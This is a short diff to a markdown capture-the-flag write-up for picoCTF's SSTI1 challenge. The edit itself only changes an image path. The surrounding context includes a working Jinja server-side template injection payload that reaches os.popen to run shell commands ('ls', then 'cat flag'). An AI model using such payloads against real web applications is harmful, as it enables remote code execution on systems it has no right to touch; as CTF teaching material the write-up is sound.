@@ -40,7 +40,7 @@ From here, essentially everything can be accessed via [magic methods](https://ww
 {{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
 ```
 
-![[ls.png]]
+![[media/ctf/picoCTF/SSTI1/ls.png]]
 ![[ls_result.png]]
 
 And of course we are interested in `flag`. So we can adapt this payload to run `cat flag`:
